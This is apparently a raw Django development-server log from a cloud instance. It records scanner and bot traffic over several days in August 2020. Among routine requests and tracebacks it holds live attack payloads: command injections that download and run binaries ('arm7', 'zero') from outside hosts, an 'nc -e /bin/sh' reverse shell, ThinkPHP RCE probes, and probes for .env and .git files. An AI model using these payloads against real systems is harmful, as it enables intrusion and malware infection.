Watching for file changes with StatReloader
[08/Aug/2020 15:19:26] "GET / HTTP/1.1" 200 1833
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
Not Found: /favicon.ico
[16/Aug/2020 12:01:42] "GET /favicon.ico HTTP/1.1" 404 2613
Invalid HTTP_HOST header: 'instance-4.us-central1-a.c.my-second-project-285813.internal'. You may need to add 'instance-4.us-central1-a.c.my-second-project-285813.internal' to ALLOWED_HOSTS.
Bad Request: /
[16/Aug/2020 12:13:39] "GET / HTTP/1.0" 400 59583
Invalid HTTP_HOST header: '0'. You may need to add '0' to ALLOWED_HOSTS.
Bad Request: /
[16/Aug/2020 12:13:50] "GET / HTTP/1.1" 400 58963
Invalid HTTP_HOST header: 'instance-4.us-central1-a.c.my-second-project-285813.internal'. You may need to add 'instance-4.us-central1-a.c.my-second-project-285813.internal' to ALLOWED_HOSTS.
Bad Request: /cgi-bin/mainfunction.cgi
[16/Aug/2020 12:31:03] "POST /cgi-bin/mainfunction.cgi?action=login&keyPath=%27%0A/bin/sh${IFS}-c${IFS}'cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}arm7;${IFS}busybox${IFS}wget${IFS}http://19ce033f.ngrok.io/arm7;${IFS}chmod${IFS}777${IFS}arm7;${IFS}./arm7'%0A%27&loginUser=a&loginPwd=a HTTP/1.1" 400 63228
[16/Aug/2020 13:02:47] "GET / HTTP/1.1" 200 5033
Invalid HTTP_HOST header: 'instance-4.us-central1-a.c.my-second-project-285813.internal'. You may need to add 'instance-4.us-central1-a.c.my-second-project-285813.internal' to ALLOWED_HOSTS.
Bad Request: /
Not Found: /api/jsonws/invoke
[16/Aug/2020 13:35:44] "POST /api/jsonws/invoke HTTP/1.1" 404 2635
[16/Aug/2020 14:50:26] "GET / HTTP/1.1" 200 5033
[16/Aug/2020 14:54:27] "GET / HTTP/1.1" 200 5033
[16/Aug/2020 14:56:48] "GET / HTTP/1.1" 200 5033
Not Found: /w00tw00t.at.blackhats.romanian.anti-sec:)
[16/Aug/2020 14:57:27] "GET /w00tw00t.at.blackhats.romanian.anti-sec:) HTTP/1.1" 404 2703
Not Found: /phpmyadmin/scripts/setup.php
[16/Aug/2020 14:57:27] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 404 2664
Not Found: /pma/scripts/setup.php
[16/Aug/2020 14:57:27] "GET /pma/scripts/setup.php HTTP/1.1" 404 2643
Not Found: /myadmin/scripts/setup.php
[16/Aug/2020 14:57:27] "GET /myadmin/scripts/setup.php HTTP/1.1" 404 2655
Not Found: /boaform/admin/formLogin
[16/Aug/2020 15:25:37] "POST /boaform/admin/formLogin HTTP/1.1" 404 2653
[16/Aug/2020 17:01:34] "GET / HTTP/1.1" 200 5033
Invalid HTTP_HOST header: 'instance-4.us-central1-a.c.my-second-project-285813.internal'. You may need to add 'instance-4.us-central1-a.c.my-second-project-285813.internal' to ALLOWED_HOSTS.
Bad Request: /
[16/Aug/2020 18:32:39] "GET / HTTP/1.0" 400 60035
[16/Aug/2020 18:48:49] "GET / HTTP/1.1" 200 5033
[16/Aug/2020 19:46:05] "GET / HTTP/1.1" 200 5033
Not Found: /webfig/
[16/Aug/2020 19:46:05] "GET /webfig/ HTTP/1.1" 404 2601
Invalid HTTP_HOST header: '0.162.232.35.bc.googleusercontent.com'. You may need to add '0.162.232.35.bc.googleusercontent.com' to ALLOWED_HOSTS.
Bad Request: /.git/HEAD
[16/Aug/2020 19:47:40] "GET /.git/HEAD HTTP/1.1" 400 59770
[16/Aug/2020 20:16:36] "GET / HTTP/1.1" 200 5033
[16/Aug/2020 20:35:10] "GET / HTTP/1.1" 200 5033
----------------------------------------
Exception happened during processing of request from ('192.35.168.201', 55032)
Traceback (most recent call last):
  File "/usr/lib/python3.8/socketserver.py", line 650, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib/python3.8/socketserver.py", line 360, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib/python3.8/socketserver.py", line 720, in __init__
    self.handle()
  File "/usr/local/lib/python3.8/dist-packages/django/core/servers/basehttp.py", line 172, in handle
    self.handle_one_request()
  File "/usr/local/lib/python3.8/dist-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib/python3.8/socket.py", line 669, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[16/Aug/2020 21:16:27] "GET / HTTP/1.1" 200 5033
----------------------------------------
Exception happened during processing of request from ('192.35.168.201', 33780)
Traceback (most recent call last):
  File "/usr/lib/python3.8/socketserver.py", line 650, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib/python3.8/socketserver.py", line 360, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib/python3.8/socketserver.py", line 720, in __init__
    self.handle()
  File "/usr/local/lib/python3.8/dist-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/usr/local/lib/python3.8/dist-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib/python3.8/socket.py", line 669, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[16/Aug/2020 21:16:27] "GET / HTTP/1.1" 200 5033
[16/Aug/2020 22:14:39] "GET / HTTP/1.1" 200 5033
Not Found: /solr/admin/info/system
[16/Aug/2020 22:23:35] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 2657
[16/Aug/2020 22:30:51] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 5033
[16/Aug/2020 22:39:23] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 5033
Not Found: /index.php
[16/Aug/2020 22:42:30] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 404 2727
[16/Aug/2020 23:21:33] "GET / HTTP/1.1" 200 5033
Invalid HTTP_HOST header: '0.162.232.35.bc.googleusercontent.com'. You may need to add '0.162.232.35.bc.googleusercontent.com' to ALLOWED_HOSTS.
Bad Request: /.git/HEAD
[16/Aug/2020 23:24:57] "GET /.git/HEAD HTTP/1.1" 400 59768
Not Found: /config/getuser
[17/Aug/2020 00:12:06] "GET /config/getuser?index=0 HTTP/1.1" 404 2633
Not Found: /api/jsonws/invoke
[17/Aug/2020 00:26:00] "POST /api/jsonws/invoke HTTP/1.1" 404 2635
Not Found: /blog/xmlrpc.php
[17/Aug/2020 00:53:41] "POST /blog/xmlrpc.php HTTP/1.1" 404 2626
Not Found: /xmlrpc.php
[17/Aug/2020 00:53:41] "POST /xmlrpc.php HTTP/1.1" 404 2611
Invalid HTTP_HOST header: '112.124.42.80:63435'. You may need to add '112.124.42.80' to ALLOWED_HOSTS.
Bad Request: /http:/112.124.42.80:63435/
[17/Aug/2020 01:55:26] "HEAD http://112.124.42.80:63435/ HTTP/1.1" 400 60238
[17/Aug/2020 01:57:05] "GET / HTTP/1.1" 200 5033
[17/Aug/2020 01:58:16] "GET / HTTP/1.1" 200 5033
[17/Aug/2020 02:44:51] "GET / HTTP/1.1" 200 5033
[17/Aug/2020 03:38:38] "GET / HTTP/1.1" 200 5033
----------------------------------------
Exception happened during processing of request from ('191.100.8.50', 33621)
Traceback (most recent call last):
  File "/usr/lib/python3.8/socketserver.py", line 650, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib/python3.8/socketserver.py", line 360, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib/python3.8/socketserver.py", line 720, in __init__
    self.handle()
  File "/usr/local/lib/python3.8/dist-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/usr/local/lib/python3.8/dist-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib/python3.8/socket.py", line 669, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
[17/Aug/2020 04:34:28] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2733
[17/Aug/2020 04:36:48] "GET / HTTP/1.1" 200 5033
Invalid HTTP_HOST header: 'instance-4.us-central1-a.c.my-second-project-285813.internal'. You may need to add 'instance-4.us-central1-a.c.my-second-project-285813.internal' to ALLOWED_HOSTS.
Bad Request: /
[17/Aug/2020 04:37:01] "GET / HTTP/1.0" 400 59959
[17/Aug/2020 05:45:05] "GET / HTTP/1.1" 200 5033
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
[17/Aug/2020 05:45:59] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2734
[17/Aug/2020 07:18:21] "GET / HTTP/1.1" 200 5033
[17/Aug/2020 08:29:02] "GET / HTTP/1.1" 200 5033
Invalid HTTP_HOST header: 'instance-4.us-central1-a.c.my-second-project-285813.internal'. You may need to add 'instance-4.us-central1-a.c.my-second-project-285813.internal' to ALLOWED_HOSTS.
Bad Request: /
[17/Aug/2020 08:40:51] "GET / HTTP/1.0" 400 59722
[17/Aug/2020 10:22:07] "GET / HTTP/1.1" 200 5033
Not Found: /phpmyadmin/index.php
[17/Aug/2020 10:47:22] "GET /phpmyadmin/index.php?lang=en HTTP/1.1" 404 2648
Not Found: /phpMyadmin/index.php
[17/Aug/2020 10:47:23] "GET /phpMyadmin/index.php?lang=en HTTP/1.1" 404 2648
Not Found: /phpMyAdmin/index.php
[17/Aug/2020 10:47:24] "GET /phpMyAdmin/index.php?lang=en HTTP/1.1" 404 2648
Not Found: /phpMyAdmin/index.php
[17/Aug/2020 10:47:24] "GET /phpMyAdmin/index.php?lang=en&pma_username=popa3d&pma_password=popa3d HTTP/1.1" 404 2696
[17/Aug/2020 12:13:37] "GET / HTTP/1.1" 200 5033
Invalid HTTP_HOST header: 'www.google.com'. You may need to add 'www.google.com' to ALLOWED_HOSTS.
Bad Request: /http:/www.google.com/
[17/Aug/2020 12:24:34] "GET http://www.google.com/ HTTP/1.0" 400 59776
[17/Aug/2020 12:30:02] "GET / HTTP/1.1" 200 5033
Not Found: /solr/admin/info/system
[17/Aug/2020 12:51:40] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 2657
[17/Aug/2020 13:00:11] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 5033
[17/Aug/2020 13:09:50] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 5033
Not Found: /index.php
[17/Aug/2020 13:13:22] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 404 2727
[17/Aug/2020 13:14:15] "GET / HTTP/1.1" 200 5033
[17/Aug/2020 13:22:38] "GET / HTTP/1.1" 200 5033
[17/Aug/2020 13:27:47] "GET / HTTP/1.1" 200 5033
[17/Aug/2020 15:06:51] "GET / HTTP/1.1" 200 5033
Not Found: /api/jsonws/invoke
[17/Aug/2020 15:22:52] "POST /api/jsonws/invoke HTTP/1.1" 404 2635
Not Found: /TP/public/index.php
[17/Aug/2020 16:13:29] "GET /TP/public/index.php HTTP/1.1" 404 2637
Not Found: /TP/index.php
[17/Aug/2020 16:13:29] "GET /TP/index.php HTTP/1.1" 404 2616
Not Found: /thinkphp/html/public/index.php
[17/Aug/2020 16:13:31] "GET /thinkphp/html/public/index.php HTTP/1.1" 404 2670
Not Found: /html/public/index.php
[17/Aug/2020 16:13:32] "GET /html/public/index.php HTTP/1.1" 404 2643
Not Found: /public/index.php
[17/Aug/2020 16:13:36] "GET /public/index.php HTTP/1.1" 404 2628
Not Found: /TP/html/public/index.php
[17/Aug/2020 16:13:37] "GET /TP/html/public/index.php HTTP/1.1" 404 2652
Not Found: /elrekt.php
[17/Aug/2020 16:13:38] "GET /elrekt.php HTTP/1.1" 404 2610
[17/Aug/2020 16:13:43] "GET / HTTP/1.1" 200 5033
Not Found: /phpmyadmin/index.php
[17/Aug/2020 16:18:05] "GET /phpmyadmin/index.php?lang=en HTTP/1.1" 404 2648
Not Found: /phpMyadmin/index.php
[17/Aug/2020 16:18:05] "GET /phpMyadmin/index.php?lang=en HTTP/1.1" 404 2648
Not Found: /phpMyAdmin/index.php
[17/Aug/2020 16:18:05] "GET /phpMyAdmin/index.php?lang=en HTTP/1.1" 404 2648
Not Found: /phpMyAdmin/index.php
[17/Aug/2020 16:18:06] "GET /phpMyAdmin/index.php?lang=en&pma_username=popa3d&pma_password=popa3d HTTP/1.1" 404 2696
[17/Aug/2020 16:59:35] "GET / HTTP/1.1" 200 5033
Not Found: /webfig/
[17/Aug/2020 16:59:38] "GET /webfig/ HTTP/1.1" 404 2601
Not Found: /config/getuser
[17/Aug/2020 18:26:50] "GET /config/getuser?index=0 HTTP/1.1" 404 2633
[17/Aug/2020 18:30:14] "GET / HTTP/1.1" 200 5033
[17/Aug/2020 18:37:22] "GET / HTTP/1.1" 200 5033
[17/Aug/2020 20:01:55] "GET / HTTP/1.1" 200 5033
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
[17/Aug/2020 20:39:49] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2733
Not Found: /.env
[17/Aug/2020 21:03:36] "GET /.env HTTP/1.1" 404 2592
Forbidden (CSRF cookie not set.): /
[17/Aug/2020 21:03:36] "POST / HTTP/1.1" 403 2864
[17/Aug/2020 21:39:08] "GET / HTTP/1.1" 200 5033
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
[17/Aug/2020 21:59:28] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2734
Invalid HTTP_HOST header: 'instance-4.us-central1-a.c.my-second-project-285813.internal'. You may need to add 'instance-4.us-central1-a.c.my-second-project-285813.internal' to ALLOWED_HOSTS.
Bad Request: /
[17/Aug/2020 22:35:39] "GET / HTTP/1.0" 400 59583
Invalid HTTP_HOST header: '0'. You may need to add '0' to ALLOWED_HOSTS.
Bad Request: /
[17/Aug/2020 22:35:44] "GET / HTTP/1.1" 400 58963
[17/Aug/2020 23:30:09] "GET / HTTP/1.1" 200 5033
Invalid HTTP_HOST header: 'instance-4.us-central1-a.c.my-second-project-285813.internal'. You may need to add 'instance-4.us-central1-a.c.my-second-project-285813.internal' to ALLOWED_HOSTS.
Bad Request: /
[18/Aug/2020 01:19:21] "GET / HTTP/1.0" 400 60035
[18/Aug/2020 02:56:58] code 400, message Bad HTTP/0.9 request type ('\x00\x0e8Ä¢ë')
[18/Aug/2020 02:56:58] " 8Ä¢ë	ûÌÌ     " 400 -
Invalid HTTP_HOST header: 'instance-4.us-central1-a.c.my-second-project-285813.internal'. You may need to add 'instance-4.us-central1-a.c.my-second-project-285813.internal' to ALLOWED_HOSTS.
Bad Request: /setup.cgi
Not Found: /solr/admin/info/system
[18/Aug/2020 04:23:15] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 2657
[18/Aug/2020 04:36:17] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 5033
[18/Aug/2020 04:51:55] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 5033
Not Found: /index.php
[18/Aug/2020 04:58:56] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 404 2727
Invalid HTTP_HOST header: 'instance-4.us-central1-a.c.my-second-project-285813.internal'. You may need to add 'instance-4.us-central1-a.c.my-second-project-285813.internal' to ALLOWED_HOSTS.
Bad Request: /
[18/Aug/2020 06:47:11] "GET / HTTP/1.1" 200 5033
[18/Aug/2020 07:25:20] "GET / HTTP/1.1" 200 5033
Invalid HTTP_HOST header: 'instance-4.us-central1-a.c.my-second-project-285813.internal'. You may need to add 'instance-4.us-central1-a.c.my-second-project-285813.internal' to ALLOWED_HOSTS.
Bad Request: /
Invalid HTTP_HOST header: 'instance-4.us-central1-a.c.my-second-project-285813.internal'. You may need to add 'instance-4.us-central1-a.c.my-second-project-285813.internal' to ALLOWED_HOSTS.
Bad Request: /
Not Found: /api/jsonws/invoke
[18/Aug/2020 08:23:20] "POST /api/jsonws/invoke HTTP/1.1" 404 2635
[18/Aug/2020 09:26:51] "GET / HTTP/1.1" 200 5033
[18/Aug/2020 09:32:39] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
[18/Aug/2020 09:32:39] "  /*à     Cookie: mstshash=Administr" 400 -
[18/Aug/2020 10:10:03] "GET / HTTP/1.1" 200 5033
Invalid HTTP_HOST header: 'instance-4.us-central1-a.c.my-second-project-285813.internal'. You may need to add 'instance-4.us-central1-a.c.my-second-project-285813.internal' to ALLOWED_HOSTS.
Bad Request: /
[18/Aug/2020 11:43:09] "GET / HTTP/1.1" 400 59586
Invalid HTTP_HOST header: 'example.com'. You may need to add 'example.com' to ALLOWED_HOSTS.
Bad Request: /http:/example.com/
[18/Aug/2020 11:58:13] "GET http://example.com/ HTTP/1.1" 400 59502
[18/Aug/2020 12:13:54] "GET / HTTP/1.1" 200 5033
[18/Aug/2020 12:31:32] "GET / HTTP/1.1" 200 5033
[18/Aug/2020 13:01:02] "GET / HTTP/1.1" 200 5033
Not Found: /solr/admin/info/system
[18/Aug/2020 13:27:05] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 2657
[18/Aug/2020 13:27:36] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 5033
[18/Aug/2020 13:28:20] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 5033
Not Found: /index.php
[18/Aug/2020 13:28:28] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 404 2727
Not Found: /api/jsonws/invoke
[18/Aug/2020 13:36:54] "POST /api/jsonws/invoke HTTP/1.1" 404 2635
[18/Aug/2020 13:41:57] "GET / HTTP/1.1" 200 5033
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
[18/Aug/2020 13:55:47] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2733
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
[18/Aug/2020 14:00:51] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2734
Invalid HTTP_HOST header: 'instance-4.us-central1-a.c.my-second-project-285813.internal'. You may need to add 'instance-4.us-central1-a.c.my-second-project-285813.internal' to ALLOWED_HOSTS.
Bad Request: /cgi-bin/kerbynet
[18/Aug/2020 15:25:18] "GET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 HTTP/1.0" 400 61723
[18/Aug/2020 15:43:17] "GET / HTTP/1.1" 200 5033
Invalid HTTP_HOST header: 'instance-4.us-central1-a.c.my-second-project-285813.internal'. You may need to add 'instance-4.us-central1-a.c.my-second-project-285813.internal' to ALLOWED_HOSTS.
Bad Request: /
[18/Aug/2020 15:48:42] "GET / HTTP/1.0" 400 59710
Invalid HTTP_HOST header: 'instance-4.us-central1-a.c.my-second-project-285813.internal'. You may need to add 'instance-4.us-central1-a.c.my-second-project-285813.internal' to ALLOWED_HOSTS.
Bad Request: /
[18/Aug/2020 15:51:05] "GET /?system(%27nc+-e+/bin/sh+45.95.168.170+1249%27)%3ba%23 HTTP/1.1" 400 61148
[18/Aug/2020 16:13:12] "GET / HTTP/1.1" 200 5033
Not Found: /blog/xmlrpc.php
[18/Aug/2020 17:26:59] "POST /blog/xmlrpc.php HTTP/1.1" 404 2626
Not Found: /xmlrpc.php
[18/Aug/2020 17:26:59] "POST /xmlrpc.php HTTP/1.1" 404 2611
Invalid HTTP_HOST header: 'instance-4.us-central1-a.c.my-second-project-285813.internal'. You may need to add 'instance-4.us-central1-a.c.my-second-project-285813.internal' to ALLOWED_HOSTS.
Bad Request: /
[18/Aug/2020 18:25:48] "GET / HTTP/1.1" 200 5033
Invalid HTTP_HOST header: 'instance-4.us-central1-a.c.my-second-project-285813.internal'. You may need to add 'instance-4.us-central1-a.c.my-second-project-285813.internal' to ALLOWED_HOSTS.
Bad Request: /cgi-bin/kerbynet
[18/Aug/2020 20:21:39] "GET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 HTTP/1.0" 400 61723
[18/Aug/2020 21:46:18] "GET / HTTP/1.1" 200 5033
----------------------------------------
Exception happened during processing of request from ('213.65.13.8', 46217)
Traceback (most recent call last):
  File "/usr/lib/python3.8/socketserver.py", line 650, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib/python3.8/socketserver.py", line 360, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib/python3.8/socketserver.py", line 720, in __init__
    self.handle()
  File "/usr/local/lib/python3.8/dist-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/usr/local/lib/python3.8/dist-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib/python3.8/socket.py", line 669, in readinto
    return self._sock.recv_into(b)
